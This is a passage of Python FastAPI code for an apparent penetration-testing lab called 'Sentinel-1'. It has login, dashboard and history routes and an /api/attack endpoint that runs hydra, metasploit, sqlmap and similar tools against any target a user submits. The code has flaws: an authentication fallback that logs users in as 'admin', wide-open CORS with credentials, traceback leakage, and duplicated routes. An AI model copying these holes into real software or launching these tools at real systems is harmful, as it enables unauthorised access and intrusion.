                print("✓ Correlation Engine initialized with AI integration")
            except Exception as e:
                print(f"⚠ Correlation Engine initialization failed: {e}")
                import traceback
                traceback.print_exc()
        
    except Exception as e:
        print(f"⚠ Database init error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        db.close()
    
    # Final GPU memory report
    if CUDA_AVAILABLE:
        allocated = torch.cuda.memory_allocated(0) / 1e6
        reserved = torch.cuda.memory_reserved(0) / 1e6
        print(f"\n📊 Final GPU Memory Status:")
        print(f"  • Allocated: {allocated:.1f} MB")
        print(f"  • Reserved: {reserved:.1f} MB")
        print(f"  • Free: {(gpu_memory * 1000 - reserved):.1f} MB")
    
    print("\n" + "=" * 60)
    print(" ✓ Application Ready!".center(60))
    print(" 📍 http://localhost:8000".center(60))
    print(" 📍 http://localhost:8000/docs".center(60))
    print("=" * 60 + "\n")
    
    yield
    
    # Shutdown - clean up GPU memory
    print("Shutting down, cleaning up GPU memory...")
    AISingleton.unload_model()
    if CUDA_AVAILABLE:
        torch.cuda.empty_cache()
        print("✓ GPU cache cleared")
# ==================== FASTAPI APP INITIALIZATION ====================

app = FastAPI(
    title="Sentinel-1 Intelligence Hub",
    version="6.5",
    description="Cybersecurity AI Platform with Prometheus & Grafana Integration"
)

# ==================== MIDDLEWARE ====================

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Mount Socket.IO
if socket_app:
    app.mount("/socket.io", socket_app)

# Rate limiter
if 'slowapi' in IMPORT_STATUS and IMPORT_STATUS['slowapi'] == '✓':
    limiter = Limiter(key_func=get_remote_address)
    app.state.limiter = limiter
    app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# Templates
templates = Jinja2Templates(directory="templates")
@app.middleware("http")
async def add_correlation_to_request(request: Request, call_next):
    request.state.correlation_system = correlation_system
    response = await call_next(request)
    return response


# --- FASTAPI INSTANTIATION ---
# app = FastAPI(
#     title="CyberSec Lab - AI Intelligence Engine + Correlation",
#     description="Advanced Penetration Testing Platform with GPU Acceleration, AI Security Reasoning, and Event Correlation",
#     version="6.2",
#     lifespan=lifespan
# )

# # Add CORS
# app.add_middleware(
#     CORSMiddleware,
#     allow_origins=["*"],
#     allow_credentials=True,
#     allow_methods=["*"],
#     allow_headers=["*"],
# )

# # Mount Socket.IO if available
# if socket_app:
#     app.mount("/socket.io", socket_app)

# # Rate limiter
# if 'slowapi' in IMPORT_STATUS and IMPORT_STATUS['slowapi'] == '✓':
#     limiter = Limiter(key_func=get_remote_address)
#     app.state.limiter = limiter
#     app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# # Templates
# templates = Jinja2Templates(directory="templates")

# Add middleware for correlation system
# @app.middleware("http")
# async def add_correlation_to_request(request: Request, call_next):
#     request.state.correlation_system = correlation_system
#     response = await call_next(request)
#     return response

# ==================== API ENDPOINTS (JSON) ====================
@app.get("/api/status")
async def api_status():
    """API endpoint that returns JSON - separate from HTML routes"""
    return {
        "message": "CyberSec Lab API - AI Intelligence Engine + Correlation",
        "version": "6.2",
        "gpu": CUDA_AVAILABLE,
        "gpu_name": gpu_name if CUDA_AVAILABLE else None,
        "ai_engine": "enabled" if intelligence_engine else "disabled",
        "correlation_engine": "enabled" if correlation_system else "disabled"
    }

@app.get("/api/health")
async def api_health():
    """API health check endpoint"""
    return {
        "status": "healthy",
        "timestamp": datetime.utcnow().isoformat(),
        "services": {
            "database": "connected",
            "redis": bool(REDIS_CLIENT),
            "celery": bool(celery_app),
            "gpu": CUDA_AVAILABLE,
            "ai_engine": bool(intelligence_engine),
            "correlation_engine": bool(correlation_system)
        }
    }

@app.get("/api/system/gpu-info")
async def get_gpu_info(current_user: "User" = Depends(get_current_user)):
    """Get detailed GPU information and memory usage"""
    if not CUDA_AVAILABLE:
        return {"gpu_available": False, "message": "CUDA not available"}
    
    try:
        allocated = torch.cuda.memory_allocated(0) / 1e6
        reserved = torch.cuda.memory_reserved(0) / 1e6
        total = gpu_memory * 1000  # Convert to MB
        
        return {
            "gpu_available": True,
            "gpu_name": gpu_name,
            "total_vram_mb": int(total),
            "allocated_mb": int(allocated),
            "reserved_mb": int(reserved),
            "free_mb": int(total - reserved),
            "cuda_version": torch.version.cuda,
            "model_loaded": AISingleton._model is not None
        }
    except Exception as e:
        return {"gpu_available": True, "error": str(e)}

# ==================== WEB ROUTES (HTML) ====================
# @app.get("/", response_class=HTMLResponse, include_in_schema=False)
# async def index(request: Request):
#     """Landing page - renders index.html"""
#     try:
#         return templates.TemplateResponse("index.html", {"request": request})
#     except Exception as e:
#         return HTMLResponse(content=f"<h1>Error loading template: {e}</h1><p>Please ensure index.html exists in the templates folder.</p>")
# ==================== WEB ROUTES (HTML) ====================
@app.get("/", response_class=HTMLResponse, include_in_schema=False)
async def index(request: Request):
    """Landing page - renders index.html"""
    try:
        # Use the index.html template - it exists
        return templates.TemplateResponse("index.html", {"request": request})
    except Exception as e:
        import traceback
        traceback.print_exc()
        return HTMLResponse(content=f"""
        <html>
            <head><title>Error</title></head>
            <body style="background: #0a0c10; color: #fff; font-family: sans-serif; padding: 20px;">
                <h1 style="color: #ff3b3b;">Template Error</h1>
                <p>Error loading template: {e}</p>
                <pre style="background: #1e2430; padding: 10px; border-radius: 5px;">{traceback.format_exc()}</pre>
                <hr>
                <p>Templates directory: templates/</p>
                <p>Looking for: index.html</p>
                <p><a href="/dashboard" style="color: #00ff9d;">Try going to /dashboard directly</a></p>
            </body>
        </html>
        """)
# @app.get('/favicon.ico', include_in_schema=False)
# async def favicon():
#     """Serve favicon"""
#     favicon_path = os.path.join("templates", "favicon.ico")
#     if os.path.exists(favicon_path):
#         return FileResponse(favicon_path)
#     # Return a data URI with a simple shield icon
#     return HTMLResponse(content="""
#     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
#         <rect width="100" height="100" fill="#0a0c10"/>
#         <path d="M20 20 L80 20 L80 60 L50 80 L20 60 Z" fill="none" stroke="#00ff9d" stroke-width="4"/>
#         <circle cx="50" cy="40" r="10" fill="none" stroke="#00b8ff" stroke-width="3"/>
#     </svg>
#     """, media_type="image/svg+xml")
# @app.get("/login", response_class=HTMLResponse)
# async def login_page(request: Request):
#     return templates.TemplateResponse("login.html", {"request": request})
# @app.get("/login", response_class=HTMLResponse, include_in_schema=False)
# async def login_page(request: Request):
#     """Login page"""
#     return templates.TemplateResponse("login.html", {"request": request})
# First, the GET route for the login page
# @app.get("/login", response_class=HTMLResponse, include_in_schema=False)
# async def login_page(request: Request):
#     """Login page - renders login.html"""
#     try:
#         return templates.TemplateResponse("login.html", {"request": request})
#     except Exception as e:
#         print(f"Login template error: {e}")
#         return HTMLResponse(content=f"""
#         ...
#         """)



@app.get("/metrics")
async def metrics():
    return Response(
        content=generate_latest(),
        media_type=CONTENT_TYPE_LATEST
 )

@app.get("/favicon.ico", include_in_schema=False)
async def favicon():
    return Response(status_code=204)
from prometheus_client import Counter, Gauge, Histogram, REGISTRY
@app.get("/")
async def root():
    return {
        "message": "Sentinel-1 CyberSec Lab Running",
        "metrics": "/metrics",
        "status": "healthy"
    }

@app.get("/index")
async def index():
    return await root()
@app.get("/register", response_class=HTMLResponse, include_in_schema=False)
async def register_page(request: Request):
    """Register page - renders register.html"""
    try:
        return templates.TemplateResponse("register.html", {"request": request})
    except Exception as e:
        print(f"Register template error: {e}")
        return RedirectResponse(url="/login")

@app.get("/dashboard", response_class=HTMLResponse, include_in_schema=False)
async def dashboard_page(request: Request, db: Session = Depends(get_db)):
    """Dashboard page - requires authentication"""
    token = request.cookies.get("access_token")
    if not token:
        return RedirectResponse(url="/login")
    
    try:
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")
        
        if 'jose' in IMPORT_STATUS and IMPORT_STATUS['jose'] == '✓':
            payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
            username = payload.get("sub")
        else:
            username = "admin"
        
        user = db.query(User).filter(User.username == username).first()
        if not user:
            return RedirectResponse(url="/login")
    except Exception as e:
        print(f"Auth error: {e}")
        return RedirectResponse(url="/login")
    
    # Get stats for dashboard
    try:
        recent_scans = db.query(ScanHistory).filter(
            ScanHistory.user_id == user.id
        ).order_by(ScanHistory.timestamp.desc()).limit(5).all()
    except:
        recent_scans = []
    
    try:
        recent_attacks = db.query(AttackHistory).filter(
            AttackHistory.user_id == user.id
        ).order_by(AttackHistory.timestamp.desc()).limit(5).all()
    except:
        recent_attacks = []
    
    try:
        scans_count = db.query(ScanHistory).filter(
            ScanHistory.user_id == user.id
        ).count()
    except:
        scans_count = 0
    
    try:
        attacks_count = db.query(AttackHistory).filter(
            AttackHistory.user_id == user.id
        ).count()
    except:
        attacks_count = 0
    
    try:
        tools = db.query(KaliTools).limit(12).all()
    except:
        tools = []
    
    # Check Kali VM status
    kali_status = False
    try:
        kali_status = kali_vm.check_vm_status()
    except:
        pass
    
    return templates.TemplateResponse("dashboard.html", {
        "request": request,
        "user": user,
        "recent_scans": recent_scans,
        "recent_attacks": recent_attacks,
        "scans": recent_scans,
        "attacks": recent_attacks,
        "scans_count": scans_count,
        "attacks_count": attacks_count,
        "tools": tools,
        "kali_status": kali_status,
        "gpu_name": gpu_name if CUDA_AVAILABLE else "CPU",
        "gpu_available": CUDA_AVAILABLE,
        "ai_enabled": True
    })

@app.get("/scan", response_class=HTMLResponse, include_in_schema=False)
async def scan_page(request: Request, db: Session = Depends(get_db)):
    """Vulnerability scanner page"""
    # Check authentication
    token = request.cookies.get("access_token")
    if not token:
        return RedirectResponse(url="/login")
    
    try:
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")
        
        if 'jose' in IMPORT_STATUS and IMPORT_STATUS['jose'] == '✓':
            payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
            username = payload.get("sub")
        else:
            username = "admin"
        
        # Verify user exists
        user = db.query(User).filter(User.username == username).first()
        if not user or not user.is_active:
            return RedirectResponse(url="/login")
            
    except Exception as e:
        print(f"Auth error in scan page: {e}")
        return RedirectResponse(url="/login")
    
    # Get recent scans for the user
    recent_scans = db.query(ScanHistory).filter(
        ScanHistory.user_id == user.id
    ).order_by(ScanHistory.timestamp.desc()).limit(5).all()
    
    # Pass user info to template
    return templates.TemplateResponse("scan.html", {
        "request": request,
        "user": user,
        "user_id": user.id,
        "username": user.username,
        "recent_scans": recent_scans,
        "gpu_name": gpu_name if CUDA_AVAILABLE else "CPU",
        "gpu_available": CUDA_AVAILABLE,
        "ai_enabled": True
    })

@app.get("/terminal", response_class=HTMLResponse, include_in_schema=False)
async def terminal_page(request: Request, db: Session = Depends(get_db)):
    """AI Terminal page"""
    token = request.cookies.get("access_token")
    if not token:
        return RedirectResponse(url="/login")
    
    try:
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")
        
        if 'jose' in IMPORT_STATUS and IMPORT_STATUS['jose'] == '✓':
            payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
            username = payload.get("sub")
        else:
            username = "admin"
        
        user = db.query(User).filter(User.username == username).first()
        if not user:
            return RedirectResponse(url="/login")
            
    except Exception as e:
        print(f"Auth error in terminal page: {e}")
        return RedirectResponse(url="/login")
    
    return templates.TemplateResponse("terminal.html", {
        "request": request,
        "user": user,
        "user_id": user.id,
        "username": user.username,
        "gpu_name": gpu_name if CUDA_AVAILABLE else "CPU",
        "gpu_available": CUDA_AVAILABLE,
        "ai_enabled": True
    })

# @app.get("/results", response_class=HTMLResponse, include_in_schema=False)
# async def results_page(request: Request, db: Session = Depends(get_db)):
#     """Results page - requires authentication"""
#     token = request.cookies.get("access_token")
#     if not token:
#         return RedirectResponse(url="/login")
    
#     try:
#         if token.startswith("Bearer "):
#             token = token.replace("Bearer ", "")
        
#         if 'jose' in IMPORT_STATUS and IMPORT_STATUS['jose'] == '✓':
#             payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
#             username = payload.get("sub")
#         else:
#             username = "admin"
        
#         # Verify user exists
#         user = db.query(User).filter(User.username == username).first()
#         if not user or not user.is_active:
#             return RedirectResponse(url="/login")
            
#     except Exception as e:
#         print(f"Auth error in results page: {e}")
#         return RedirectResponse(url="/login")
    
#     # Get scan results for the user
#     try:
#         scans = db.query(ScanHistory).filter(
#             ScanHistory.user_id == user.id
#         ).order_by(ScanHistory.timestamp.desc()).all()
#     except:
#         scans = []
    
#     try:
#         attacks = db.query(AttackHistory).filter(
#             AttackHistory.user_id == user.id
#         ).order_by(AttackHistory.timestamp.desc()).all()
#     except:
#         attacks = []
    
#     try:
#         analyses = db.query(AIAnalysis).filter(
#             AIAnalysis.user_id == user.id
#         ).order_by(AIAnalysis.timestamp.desc()).limit(10).all()
#     except:
#         analyses = []
    
#     # Pass user info and results to template
#     return templates.TemplateResponse("results.html", {
#         "request": request,
#         "user": user,
#         "scans": scans,
#         "attacks": attacks,
#         "analyses": analyses,
#         "gpu_name": gpu_name if CUDA_AVAILABLE else "CPU",
#         "gpu_available": CUDA_AVAILABLE
#     })

@app.get("/tools-page", response_class=HTMLResponse, include_in_schema=False)
async def tools_page(request: Request, db: Session = Depends(get_db)):
    """Tools page - requires authentication"""
    token = request.cookies.get("access_token")
    if not token:
        return RedirectResponse(url="/login")
    
    try:
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")
        
        if 'jose' in IMPORT_STATUS and IMPORT_STATUS['jose'] == '✓':
            payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
            username = payload.get("sub")
        else:
            username = "admin"
        
        # Verify user exists
        user = db.query(User).filter(User.username == username).first()
        if not user or not user.is_active:
            return RedirectResponse(url="/login")
            
    except Exception as e:
        print(f"Auth error in tools page: {e}")
        return RedirectResponse(url="/login")
    
    # Get tools data if needed
    try:
        tools = db.query(KaliTools).all()
    except:
        tools = []
    
    # Pass user info to template
    return templates.TemplateResponse("tools.html", {
        "request": request,
        "user": user,
        "tools": tools
    })

# Add redirect from /tools to /tools-page
@app.get("/tools", response_class=HTMLResponse, include_in_schema=False)
async def tools_redirect(request: Request):
    """Redirect /tools to /tools-page"""
    return RedirectResponse(url="/tools-page")

@app.get("/history", response_class=HTMLResponse, include_in_schema=False)
async def history_page(request: Request, db: Session = Depends(get_db)):
    """History page with pagination"""
    token = request.cookies.get("access_token")
    if not token:
        return RedirectResponse(url="/login")
    
    try:
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")
        
        if 'jose' in IMPORT_STATUS and IMPORT_STATUS['jose'] == '✓':
            payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
            username = payload.get("sub")
        else:
            username = "admin"
        
        user = db.query(User).filter(User.username == username).first()
        if not user:
            return RedirectResponse(url="/login")
    except:
        return RedirectResponse(url="/login")
    
    # Get paginated history
    page = int(request.query_params.get("page", 1))
    per_page = 10
    
    scans = db.query(ScanHistory).filter(
        ScanHistory.user_id == user.id
    ).order_by(ScanHistory.timestamp.desc()).offset((page-1) * per_page).limit(per_page).all()
    
    attacks = db.query(AttackHistory).filter(
        AttackHistory.user_id == user.id
    ).order_by(AttackHistory.timestamp.desc()).offset((page-1) * per_page).limit(per_page).all()
    
    return templates.TemplateResponse("history.html", {
        "request": request,
        "scans": scans,
        "attacks": attacks,
        "page": page
    })

@app.get("/admin", response_class=HTMLResponse, include_in_schema=False)
async def admin_page(request: Request, db: Session = Depends(get_db)):
    """Admin page - requires admin role"""
    token = request.cookies.get("access_token")
    if not token:
        return RedirectResponse(url="/login")
    
    try:
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")
        
        if 'jose' in IMPORT_STATUS and IMPORT_STATUS['jose'] == '✓':
            payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
            username = payload.get("sub")
        else:
            username = "admin"
        
        user = db.query(User).filter(User.username == username).first()
        if not user or user.role != UserRole.ADMIN.value:
            return RedirectResponse(url="/dashboard")
    except:
        return RedirectResponse(url="/login")
    
    users = db.query(User).all()
    

    db.commit()
    return templates.TemplateResponse("admin.html", {
        "request": request,
        "users": users
    })

@app.get("/correlation", response_class=HTMLResponse, include_in_schema=False)
async def correlation_page(request: Request, db: Session = Depends(get_db)):
    """Correlation engine dashboard page"""
    token = request.cookies.get("access_token")
    if not token:
        return RedirectResponse(url="/login")
    
    try:
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")
        
        if 'jose' in IMPORT_STATUS and IMPORT_STATUS['jose'] == '✓':
            payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
            username = payload.get("sub")
        else:
            username = "admin"
        
        user = db.query(User).filter(User.username == username).first()
        if not user:
            return RedirectResponse(url="/login")
    except:
        return RedirectResponse(url="/login")
    
    return templates.TemplateResponse("correlation.html", {
        "request": request,
        "user": user
    })

@app.get("/burp-testing", response_class=HTMLResponse, include_in_schema=False)
async def burp_testing_page(request: Request, db: Session = Depends(get_db)):
    """Burp Suite Intruder testing page - requires authentication"""
    token = request.cookies.get("access_token")
    if not token:
        return RedirectResponse(url="/login")
    
    try:
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")
        
        if 'jose' in IMPORT_STATUS and IMPORT_STATUS['jose'] == '✓':
            payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
            username = payload.get("sub")
        else:
            username = "admin"
        
        # Verify user exists
        user = db.query(User).filter(User.username == username).first()
        if not user or not user.is_active:
            return RedirectResponse(url="/login")
            
    except Exception as e:
        print(f"Auth error in burp testing page: {e}")
        return RedirectResponse(url="/login")
    
    # Get recent scan data for the user to populate export data
    try:
        scans = db.query(ScanHistory).filter(
            ScanHistory.user_id == user.id
        ).order_by(ScanHistory.timestamp.desc()).limit(10).all()
    except:
        scans = []
    
    try:
        attacks = db.query(AttackHistory).filter(
            AttackHistory.user_id == user.id
        ).order_by(AttackHistory.timestamp.desc()).limit(10).all()
    except:
        attacks = []
    
    try:
        analyses = db.query(AIAnalysis).filter(
            AIAnalysis.user_id == user.id
        ).order_by(AIAnalysis.timestamp.desc()).limit(5).all()
    except:
        analyses = []
    
    # Create export data structure from database records
    export_data = {
        "burp": {
            "history": [],
            "findings": []
        },
        "vulnerabilities": {
            "scans": []
        },
        "wireshark": {
            "packets": []
        },
        "attacks": {
            "attempts": []
        },
        "ai_analyses": [],
        "attack_count": len(attacks),
        "scan_count": len(scans)
    }
    
    # Convert scans to export format
    for scan in scans:
        if scan.tool_used in ['nikto', 'nmap', 'sqlmap']:
            findings = []
            try:
                if scan.vulnerabilities:
                    vulns = json.loads(scan.vulnerabilities)
                    for vuln in vulns:
                        if isinstance(vuln, dict):
                            findings.append({
                                "type": vuln.get('name', 'unknown'),
                                "path": scan.target,
                                "severity": vuln.get('severity', 'MEDIUM')
                            })
            except:
                pass
            
            export_data["vulnerabilities"]["scans"].append({
                "tool": scan.tool_used,
                "target": scan.target,
                "findings": findings,
                "timestamp": scan.timestamp.isoformat() if scan.timestamp else None
            })
    
    # Convert attacks to export format
    for attack in attacks:
        export_data["attacks"]["attempts"].append({
            "target": attack.target,
            "interpreted": {
                "tool": attack.tool_used,
                "command": attack.command,
                "explanation": f"{attack.attack_type} attack"
            },
            "timestamp": attack.timestamp.isoformat() if attack.timestamp else None
        })
    
    # Add AI analyses
    for analysis in analyses:
        try:
            export_data["ai_analyses"].append({
                "analysis_id": analysis.analysis_id,
                "risk_score": analysis.risk_score,
                "confidence": analysis.confidence,
                "timestamp": analysis.timestamp.isoformat() if analysis.timestamp else None
            })
        except:
            pass
    
    # Add sample Wireshark data if none exists
    if not export_data["wireshark"]["packets"]:
        export_data["wireshark"]["packets"] = [
            {
                "source": "192.168.1.105",
                "destination": "8.8.8.8",
                "protocol": "DNS",
                "info": "Standard query A jiomart.com"
            },
            {
                "source": "192.168.1.105",
                "destination": "52.84.12.34",
                "protocol": "TCP",
                "info": "HTTP GET /products.php"
            },
            {
                "source": "52.84.12.34",
                "destination": "192.168.1.105",
                "protocol": "TCP",
                "info": "HTTP 200 OK"
            }
        ]
    
    # Add sample ports if none exists
    if not export_data.get("ports"):
        export_data["ports"] = [
            {"port": 22, "service": "ssh", "state": "open", "risk": "Medium"},
            {"port": 80, "service": "http", "state": "open", "risk": "High"},
            {"port": 443, "service": "https", "state": "open", "risk": "High"},
            {"port": 8080, "service": "http-alt", "state": "open", "risk": "Medium"}
        ]
    
    # Pass user info and export data to template
    return templates.TemplateResponse("burp-testing.html", {
        "request": request,
        "user": user,
        "user_id": user.id,
        "username": user.username,
        "export_data": json.dumps(export_data, default=str),
        "attack_count": len(attacks),
        "scan_count": len(scans),
        "gpu_name": gpu_name if CUDA_AVAILABLE else "CPU",
        "gpu_available": CUDA_AVAILABLE,
        "ai_enabled": True
    })

@app.get("/logout")
async def logout():
    """Logout and clear cookie"""
    response = RedirectResponse(url="/", status_code=302)
    response.delete_cookie("access_token")
    return response

# 
# ==================== AUTH ENDPOINTS ====================

from fastapi.responses import HTMLResponse
from fastapi import Request, Form
from fastapi.templating import Jinja2Templates
from datetime import datetime, timedelta

templates = Jinja2Templates(directory="templates")
# ===== Login Page (GET) =====
@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})
print("LOGIN GET ROUTE HIT")


# ===== Login Form Submit (POST) =====
@app.post("/login")
async def login(
    request: Request,
    username: str = Form(...),
    password: str = Form(...),
    db: Session = Depends(get_db)
):
    print(f"🔐 Login attempt: {username}")
    user = authenticate_user(db, username, password)

    if not user:
        return templates.TemplateResponse(
            "login.html",
            {"request": request, "error": "Invalid credentials"}
        )

    # --- AUTO RE-HASH LOGIC ---
    # Check if the stored password needs upgrading to a secure hash
    if not user.password.startswith('$'): 
        user.password = pwd_context.hash(password)
        db.commit()
        print(f"✅ Migrated form-user {user.username} to secure hash.")
    # --------------------------

    access_token = create_access_token(
        data={"sub": user.username},
        expires_delta=timedelta(minutes=30)
    )

    response = RedirectResponse(url="/dashboard", status_code=303)
    response.set_cookie(
        key="access_token",
        value=f"Bearer {access_token}",
        httponly=True
    )

    return response

# --- API TOKEN ENDPOINT (for programmatic access) ---
@app.post("/token", response_model=Token)
async def login_for_access_token(
    form_data: OAuth2PasswordRequestForm = Depends(),
    db: Session = Depends(get_db)
):
    """OAuth2 compatible token login, returns JWT token"""
    print(f"🔐 Login attempt: {username}")
    user = authenticate_user(db, form_data.username, form_data.password)
    if not user:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    # --- AUTO RE-HASH LOGIC ---
    # Use form_data.password because it contains the plain text version
    if not user.password.startswith('$'): 
        user.password = pwd_context.hash(form_data.password)
        # Note: we commit below with last_login, so one commit handles both
    # --------------------------

    access_token = create_access_token(
        data={"sub": user.username, "role": user.role},
        expires_delta=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    )
    
    user.last_login = datetime.utcnow()
    db.commit() # Saves both the new hash and the login time
    
    return {
        "access_token": access_token,
        "token_type": "bearer",
        "role": user.role
    }
# --- REGISTRATION ROUTES ---
@app.get("/register", response_class=HTMLResponse, include_in_schema=False)
async def register_page(request: Request):
    """Display registration page"""
    try:
        return templates.TemplateResponse(
            "register.html",
            {"request": request, "error": None}
        )
    except Exception as e:
        print(f"Register template error: {e}")
        return RedirectResponse(url="/login")

@app.post("/register", include_in_schema=False)
async def register_submit(
    request: Request,
    username: str = Form(...),
    email: str = Form(...),
    password: str = Form(...),
    db: Session = Depends(get_db)
):
    """Process registration form"""
    try:
        # Validate inputs
        if db.query(User).filter(User.username == username).first():
            return templates.TemplateResponse(
                "register.html",
                {"request": request, "error": "Username already taken"}
            )
        
        if db.query(User).filter(User.email == email).first():
            return templates.TemplateResponse(
                "register.html",
                {"request": request, "error": "Email already registered"}
            )
        
        if len(password) < 6:
            return templates.TemplateResponse(
                "register.html",
                {"request": request, "error": "Password must be at least 6 characters"}
            )
        
        # Create user
        user = User(
            username=username,
            email=email,
            password=get_password_hash(password),
            role=UserRole.USER.value,
            api_key=secrets.token_hex(32)
        )
        db.add(user)
        db.commit()
        
        # Redirect to login
        return RedirectResponse(url="/login", status_code=302)
        
    except Exception as e:
        print(f"Registration error: {e}")
        return templates.TemplateResponse(
            "register.html",
            {"request": request, "error": "Registration failed. Please try again."}
        )

@app.get("/logout")
async def logout():
    """Logout user"""
    response = RedirectResponse(url="/", status_code=302)
    response.delete_cookie("access_token", path="/")
    return response


@app.post("/register")
async def post_register(
    request: Request,
    username: str = Form(...), 
    email: str = Form(...), 
    password: str = Form(...), 
    db: Session = Depends(get_db)
):
    """Form-based registration"""
    if db.query(User).filter(User.username == username).first():
        return templates.TemplateResponse("register.html", {
            "request": request, 
            "error": "Username already taken"
        })
    
    if db.query(User).filter(User.email == email).first():
        return templates.TemplateResponse("register.html", {
            "request": request, 
            "error": "Email already registered"
        })
    
    if len(password) < 6:
        return templates.TemplateResponse("register.html", {
            "request": request, 
            "error": "Password must be at least 6 characters"
        })
    
    user = User(
        username=username,
        email=email,
        password=get_password_hash(password),
        role=UserRole.USER.value,
        api_key=secrets.token_hex(32)
    )
    db.add(user)
    db.commit()
    
    return RedirectResponse(url="/login", status_code=302)

# ==================== AI INTELLIGENCE ENDPOINTS ====================
@app.post("/api/attack")
async def execute_attack(
    request: Request,
    background_tasks: BackgroundTasks,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Execute an attack with correlation engine integration"""
    data = await request.json()
    target = data.get('target')
    tool = data.get('tool')
    
    if not target or not tool:
        raise HTTPException(status_code=400, detail="Target and tool required")
    
    # Execute appropriate tool
    if tool == 'hydra':
        service = data.get('service', 'ssh')
        results = PenetrationTools.hydra_attack(target, service)
    elif tool == 'metasploit':
        exploit = data.get('exploit', 'apache')
        results = PenetrationTools.metasploit_exploit(target, exploit)
    elif tool == 'sqlmap':
        results = PenetrationTools.sqlmap_scan(target)
    elif tool == 'nikto':
        results = PenetrationTools.nikto_scan(target)
    elif tool == 'gobuster':
        results = PenetrationTools.gobuster_dir(target)
    elif tool == 'wpscan':
        results = PenetrationTools.wpscan(target)
    elif tool == 'aircrack':
        capture = data.get('capture', 'capture.cap')
        results = PenetrationTools.aircrack_ng(capture)
    elif tool == 'john':
        hash_file = data.get('hash_file', 'hashes.txt')
        results = PenetrationTools.john_the_ripper(hash_file)
    elif tool == 'burp':
        results = PenetrationTools.burp_scan(target)
    elif tool == 'nmap':
        results = PenetrationTools.nmap_scan(target)
    else:
        results = {'success': True, 'output': f'Executed {tool} on {target}'}
    
    # Save to history
    attack = AttackHistory(
        user_id=current_user.id,
        target=target,
        attack_type=tool,
        tool_used=tool,
        command=data.get('command', ''),
        output=json.dumps(results),
        success=results.get('success', False),
        timestamp=datetime.utcnow()
    )
    db.add(attack)
    current_user.attacks_performed = (current_user.attacks_performed or 0) + 1
    current_user.score = (current_user.score or 0) + 5
    db.commit()
    db.refresh(attack)
    
    # Process through correlation engine
    if CORRELATION_AVAILABLE and correlation_system:
        try:
            # Import here to avoid circular imports
            from integration_adapter import process_tool_output
            
            # Run in background to not block response
            background_tasks.add_task(
                process_tool_output,
                tool_name=tool,
                output=results,
                target=target,
                user_id=current_user.id,
                db_session=db,
                background_tasks=background_tasks
            )
            
            # Get correlation system for immediate insights
            if correlation_system:
                results['_correlation'] = {
                    'risk_score': round(correlation_system['risk_engine'].overall_score, 2),
                    'risk_level': correlation_system['risk_engine'].get_risk_level(),
                    'events_triggered': 1
                }
        except Exception as e:
            print(f"Correlation error: {e}")
            import traceback
            traceback.print_exc()
    
    return results

@app.post("/api/ai/analyze-target")
async def ai_analyze_target(
    request: Request,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Analyze a target directly without a scan"""
    data = await request.json()
    target = data.get('target')
    scan_result = data.get('scan_result', {})
    
    if not target:
        raise HTTPException(status_code=400, detail="target required")
    
    # Ensure scan_result has required fields
    if 'services' not in scan_result:
        scan_result['services'] = []
    if 'ports' not in scan_result:
        scan_result['ports'] = []
    if 'vulnerabilities' not in scan_result:
        scan_result['vulnerabilities'] = []
    
    scan_result['target'] = target
    
    # Get similar cases
    similar_cases = []
    if rag_system and rag_system.initialized:
        similar_cases = rag_system.search(target, k=3)
    
    # Get historical attempts for this target
    history = db.query(AttackHistory).filter(
        AttackHistory.user_id == current_user.id,
        AttackHistory.target == target
    ).order_by(AttackHistory.timestamp.desc()).limit(5).all()
    
    # Run analysis
    if intelligence_engine:
        analysis = intelligence_engine.analyze(scan_result, history, similar_cases)
        
        # Save analysis to database
        ai_analysis = AIAnalysis(
            analysis_id=analysis['analysis_id'],
            user_id=current_user.id,
            scan_id=None,
            context=json.dumps(analysis['context']),
            strategies=json.dumps(analysis['strategies']),
            attack_graph=json.dumps(analysis['attack_graph']),
            risk_score=analysis['risk_score'],
            confidence=analysis['confidence'],
            mode=json.dumps(analysis['mode']),
            meta_data=json.dumps({
                'success_prediction': analysis['success_prediction'],
                'critique': analysis['critique']
            }),
            timestamp=datetime.utcnow()
        )
        db.add(ai_analysis)
        db.commit()
        
        return analysis
    else:
        # Fallback
        return {
            "error": "AI Intelligence Engine not available",
            "strategies": rag_system.generate_attack_chain(similar_cases, target) if rag_system else [],
            "note": "Using basic attack chain generation"
        }

@app.post("/api/ai/feedback")
async def submit_ai_feedback(
    feedback: FeedbackRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Submit feedback for AI analysis to improve learning"""
    
    # Create feedback record
    feedback_record = UserFeedback(
        user_id=current_user.id,
        scan_id=feedback.scan_id,
        attack_id=feedback.attack_id,
        analysis_id=feedback.analysis_id,
        rating=feedback.rating,
